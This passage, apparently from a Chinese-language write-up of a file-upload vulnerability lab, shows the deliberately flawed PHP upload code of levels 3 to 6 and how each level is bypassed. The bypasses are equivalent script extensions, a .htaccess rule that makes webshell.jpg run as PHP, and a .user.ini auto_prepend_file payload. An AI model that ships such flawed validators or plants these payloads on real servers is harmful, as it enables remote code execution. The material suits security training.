<li><code>text/xml</code>      ：  XML 格式</li>
<li><code>text/html</code>    ：  HTML 格式</li>
</ul>
<p>​</p>
<h2 id="第三关等价拓展名" class="headerLink">
    <a href="#%e7%ac%ac%e4%b8%89%e5%85%b3%e7%ad%89%e4%bb%b7%e6%8b%93%e5%b1%95%e5%90%8d" class="header-mark"></a>第三关(等价拓展名)</h2><h3 id="相关源码-2" class="headerLink">
    <a href="#%e7%9b%b8%e5%85%b3%e6%ba%90%e7%a0%81-2" class="header-mark"></a>相关源码</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$msg</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nx">UPLOAD_PATH</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$deny_ext</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;.asp&#39;</span><span class="p">,</span><span class="s1">&#39;.aspx&#39;</span><span class="p">,</span><span class="s1">&#39;.php&#39;</span><span class="p">,</span><span class="s1">&#39;.jsp&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_name</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_name</span> <span class="o">=</span> <span class="nx">deldot</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">);</span><span class="c1">//删除文件名末尾的点
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">strrchr</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">);</span> <span class="c1">//转换为小写
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">str_ireplace</span><span class="p">(</span><span class="s1">&#39;::$DATA&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$file_ext</span><span class="p">);</span><span class="c1">//去除字符串::$DATA
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">);</span> <span class="c1">//收尾去空
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">,</span> <span class="nv">$deny_ext</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$temp_file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nx">date</span><span class="p">(</span><span class="s2">&#34;YmdHis&#34;</span><span class="p">)</span><span class="o">.</span><span class="nx">rand</span><span class="p">(</span><span class="mi">1000</span><span class="p">,</span><span class="mi">9999</span><span class="p">)</span><span class="o">.</span><span class="nv">$file_ext</span><span class="p">;</span>            
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$temp_file</span><span class="p">,</span><span class="nv">$img_path</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                 <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;上传出错！&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="s1">&#39;文件夹不存在,请手工创建！&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="绕过方法-2" class="headerLink">
    <a href="#%e7%bb%95%e8%bf%87%e6%96%b9%e6%b3%95-2" class="header-mark"></a>绕过方法</h3><p>将文件的拓展名改成等价拓展名再上传：</p>
<ul>
<li>asp =&gt; asa、cer、cdx</li>
<li>aspx =&gt; ashx、asmx、ascx</li>
<li>php =&gt; php2、php3、php4、php5、phps、phtml</li>
<li>jsp =&gt; jspx、jspf</li>
</ul>
<p>​</p>
<h2 id="第四关htaccess" class="headerLink">
    <a href="#%e7%ac%ac%e5%9b%9b%e5%85%b3htaccess" class="header-mark"></a>第四关(.htaccess)</h2><h3 id="相关源码-3" class="headerLink">
    <a href="#%e7%9b%b8%e5%85%b3%e6%ba%90%e7%a0%81-3" class="header-mark"></a>相关源码</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$msg</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nx">UPLOAD_PATH</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$deny_ext</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;.php&#34;</span><span class="p">,</span><span class="s2">&#34;.php5&#34;</span><span class="p">,</span><span class="s2">&#34;.php4&#34;</span><span class="p">,</span><span class="s2">&#34;.php3&#34;</span><span class="p">,</span><span class="s2">&#34;.php2&#34;</span><span class="p">,</span><span class="s2">&#34;.php1&#34;</span><span class="p">,</span><span class="s2">&#34;.html&#34;</span><span class="p">,</span><span class="s2">&#34;.htm&#34;</span><span class="p">,</span><span class="s2">&#34;.phtml&#34;</span><span class="p">,</span><span class="s2">&#34;.pht&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp5&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp4&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp3&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp2&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp1&#34;</span><span class="p">,</span><span class="s2">&#34;.Html&#34;</span><span class="p">,</span><span class="s2">&#34;.Htm&#34;</span><span class="p">,</span><span class="s2">&#34;.pHtml&#34;</span><span class="p">,</span><span class="s2">&#34;.jsp&#34;</span><span class="p">,</span><span class="s2">&#34;.jspa&#34;</span><span class="p">,</span><span class="s2">&#34;.jspx&#34;</span><span class="p">,</span><span class="s2">&#34;.jsw&#34;</span><span class="p">,</span><span class="s2">&#34;.jsv&#34;</span><span class="p">,</span><span class="s2">&#34;.jspf&#34;</span><span class="p">,</span><span class="s2">&#34;.jtml&#34;</span><span class="p">,</span><span class="s2">&#34;.jSp&#34;</span><span class="p">,</span><span class="s2">&#34;.jSpx&#34;</span><span class="p">,</span><span class="s2">&#34;.jSpa&#34;</span><span class="p">,</span><span class="s2">&#34;.jSw&#34;</span><span class="p">,</span><span class="s2">&#34;.jSv&#34;</span><span class="p">,</span><span class="s2">&#34;.jSpf&#34;</span><span class="p">,</span><span class="s2">&#34;.jHtml&#34;</span><span class="p">,</span><span class="s2">&#34;.asp&#34;</span><span class="p">,</span><span class="s2">&#34;.aspx&#34;</span><span class="p">,</span><span class="s2">&#34;.asa&#34;</span><span class="p">,</span><span class="s2">&#34;.asax&#34;</span><span class="p">,</span><span class="s2">&#34;.ascx&#34;</span><span class="p">,</span><span class="s2">&#34;.ashx&#34;</span><span class="p">,</span><span class="s2">&#34;.asmx&#34;</span><span class="p">,</span><span class="s2">&#34;.cer&#34;</span><span class="p">,</span><span class="s2">&#34;.aSp&#34;</span><span class="p">,</span><span class="s2">&#34;.aSpx&#34;</span><span class="p">,</span><span class="s2">&#34;.aSa&#34;</span><span class="p">,</span><span class="s2">&#34;.aSax&#34;</span><span class="p">,</span><span class="s2">&#34;.aScx&#34;</span><span class="p">,</span><span class="s2">&#34;.aShx&#34;</span><span class="p">,</span><span class="s2">&#34;.aSmx&#34;</span><span class="p">,</span><span class="s2">&#34;.cEr&#34;</span><span class="p">,</span><span class="s2">&#34;.sWf&#34;</span><span class="p">,</span><span class="s2">&#34;.swf&#34;</span><span class="p">,</span><span class="s2">&#34;.ini&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_name</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_name</span> <span class="o">=</span> <span class="nx">deldot</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">);</span><span class="c1">//删除文件名末尾的点
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">strrchr</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">);</span> <span class="c1">//转换为小写
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">str_ireplace</span><span class="p">(</span><span class="s1">&#39;::$DATA&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$file_ext</span><span class="p">);</span><span class="c1">//去除字符串::$DATA
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">);</span> <span class="c1">//收尾去空
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">,</span> <span class="nv">$deny_ext</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$temp_file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$file_name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$temp_file</span><span class="p">,</span> <span class="nv">$img_path</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;上传出错！&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;此文件不允许上传!&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="s1">&#39;文件夹不存在,请手工创建！&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="绕过方法-3" class="headerLink">
    <a href="#%e7%bb%95%e8%bf%87%e6%96%b9%e6%b3%95-3" class="header-mark"></a>绕过方法</h3><p>上传一个 .htaccess 解析文件，利用其配置，将某个白名单文件的类型解析成 php 文件类型。</p>
<p>例如将 <code>webshell</code> 改成 jpg 格式( <code>webshell.jpg </code>)，上传。</p>
<p>创建一个<code>.htaccess</code>文件，内容如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;FilesMatch  &#34;webshell.jpg&#34;&gt;
</span></span><span class="line"><span class="cl">	SetHandler  application/x-httpd-php
</span></span><span class="line"><span class="cl">&lt;/FilesMatch&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>将 .htaccess 文件上传到服务器。</p>
<p>​</p>
<h2 id="第五关userini" class="headerLink">
    <a href="#%e7%ac%ac%e4%ba%94%e5%85%b3userini" class="header-mark"></a>第五关(.user.ini)</h2><h3 id="相关源码-4" class="headerLink">
    <a href="#%e7%9b%b8%e5%85%b3%e6%ba%90%e7%a0%81-4" class="header-mark"></a>相关源码</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$msg</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nx">UPLOAD_PATH</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$deny_ext</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;.php&#34;</span><span class="p">,</span><span class="s2">&#34;.php5&#34;</span><span class="p">,</span><span class="s2">&#34;.php4&#34;</span><span class="p">,</span><span class="s2">&#34;.php3&#34;</span><span class="p">,</span><span class="s2">&#34;.php2&#34;</span><span class="p">,</span><span class="s2">&#34;.html&#34;</span><span class="p">,</span><span class="s2">&#34;.htm&#34;</span><span class="p">,</span><span class="s2">&#34;.phtml&#34;</span><span class="p">,</span><span class="s2">&#34;.pht&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp5&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp4&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp3&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp2&#34;</span><span class="p">,</span><span class="s2">&#34;.Html&#34;</span><span class="p">,</span><span class="s2">&#34;.Htm&#34;</span><span class="p">,</span><span class="s2">&#34;.pHtml&#34;</span><span class="p">,</span><span class="s2">&#34;.jsp&#34;</span><span class="p">,</span><span class="s2">&#34;.jspa&#34;</span><span class="p">,</span><span class="s2">&#34;.jspx&#34;</span><span class="p">,</span><span class="s2">&#34;.jsw&#34;</span><span class="p">,</span><span class="s2">&#34;.jsv&#34;</span><span class="p">,</span><span class="s2">&#34;.jspf&#34;</span><span class="p">,</span><span class="s2">&#34;.jtml&#34;</span><span class="p">,</span><span class="s2">&#34;.jSp&#34;</span><span class="p">,</span><span class="s2">&#34;.jSpx&#34;</span><span class="p">,</span><span class="s2">&#34;.jSpa&#34;</span><span class="p">,</span><span class="s2">&#34;.jSw&#34;</span><span class="p">,</span><span class="s2">&#34;.jSv&#34;</span><span class="p">,</span><span class="s2">&#34;.jSpf&#34;</span><span class="p">,</span><span class="s2">&#34;.jHtml&#34;</span><span class="p">,</span><span class="s2">&#34;.asp&#34;</span><span class="p">,</span><span class="s2">&#34;.aspx&#34;</span><span class="p">,</span><span class="s2">&#34;.asa&#34;</span><span class="p">,</span><span class="s2">&#34;.asax&#34;</span><span class="p">,</span><span class="s2">&#34;.ascx&#34;</span><span class="p">,</span><span class="s2">&#34;.ashx&#34;</span><span class="p">,</span><span class="s2">&#34;.asmx&#34;</span><span class="p">,</span><span class="s2">&#34;.cer&#34;</span><span class="p">,</span><span class="s2">&#34;.aSp&#34;</span><span class="p">,</span><span class="s2">&#34;.aSpx&#34;</span><span class="p">,</span><span class="s2">&#34;.aSa&#34;</span><span class="p">,</span><span class="s2">&#34;.aSax&#34;</span><span class="p">,</span><span class="s2">&#34;.aScx&#34;</span><span class="p">,</span><span class="s2">&#34;.aShx&#34;</span><span class="p">,</span><span class="s2">&#34;.aSmx&#34;</span><span class="p">,</span><span class="s2">&#34;.cEr&#34;</span><span class="p">,</span><span class="s2">&#34;.sWf&#34;</span><span class="p">,</span><span class="s2">&#34;.swf&#34;</span><span class="p">,</span><span class="s2">&#34;.htaccess&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_name</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_name</span> <span class="o">=</span> <span class="nx">deldot</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">);</span><span class="c1">//删除文件名末尾的点
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">strrchr</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">);</span> <span class="c1">//转换为小写
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">str_ireplace</span><span class="p">(</span><span class="s1">&#39;::$DATA&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$file_ext</span><span class="p">);</span><span class="c1">//去除字符串::$DATA
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">);</span> <span class="c1">//首尾去空
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">,</span> <span class="nv">$deny_ext</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$temp_file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$file_name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$temp_file</span><span class="p">,</span> <span class="nv">$img_path</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;上传出错！&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;此文件类型不允许上传！&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="s1">&#39;文件夹不存在,请手工创建！&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="绕过方法-4" class="headerLink">
    <a href="#%e7%bb%95%e8%bf%87%e6%96%b9%e6%b3%95-4" class="header-mark"></a>绕过方法</h3><p>大小写，转换，空格，还有点号，正常的php类文件上传不了了，并且拒绝上传 .htaccess 文件。</p>
<p>发现没有被限制的后缀名有 <code>.php7</code> 以及 <code>.ini</code></p>
<p>先上传个<code>webshell.jpg</code>，再上传个<code>.user.ini</code>。</p>
<p><code>.user.ini</code>的内容：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-ini" data-lang="ini"><span class="line"><span class="cl"><span class="na">auto_prepend_file</span><span class="o">=</span><span class="s">webshell.jpg</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>把<code>webshell.jpg</code>当作PHP执行</p>
</blockquote>
<p><code>php.ini</code> 是 php 的配置文件，<code>.user.ini</code> 中的字段也会被 php 视为配置文件来处理，从而导致 php 的文件解析漏洞。</p>
<p>​</p>
<h2 id="第六关大小写绕过" class="headerLink">
    <a href="#%e7%ac%ac%e5%85%ad%e5%85%b3%e5%a4%a7%e5%b0%8f%e5%86%99%e7%bb%95%e8%bf%87" class="header-mark"></a>第六关(大小写绕过)</h2><h3 id="相关源码-5" class="headerLink">
    <a href="#%e7%9b%b8%e5%85%b3%e6%ba%90%e7%a0%81-5" class="header-mark"></a>相关源码</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$msg</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nx">UPLOAD_PATH</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$deny_ext</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;.php&#34;</span><span class="p">,</span><span class="s2">&#34;.php5&#34;</span><span class="p">,</span><span class="s2">&#34;.php4&#34;</span><span class="p">,</span><span class="s2">&#34;.php3&#34;</span><span class="p">,</span><span class="s2">&#34;.php2&#34;</span><span class="p">,</span><span class="s2">&#34;.html&#34;</span><span class="p">,</span><span class="s2">&#34;.htm&#34;</span><span class="p">,</span><span class="s2">&#34;.phtml&#34;</span><span class="p">,</span><span class="s2">&#34;.pht&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp5&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp4&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp3&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp2&#34;</span><span class="p">,</span><span class="s2">&#34;.Html&#34;</span><span class="p">,</span><span class="s2">&#34;.Htm&#34;</span><span 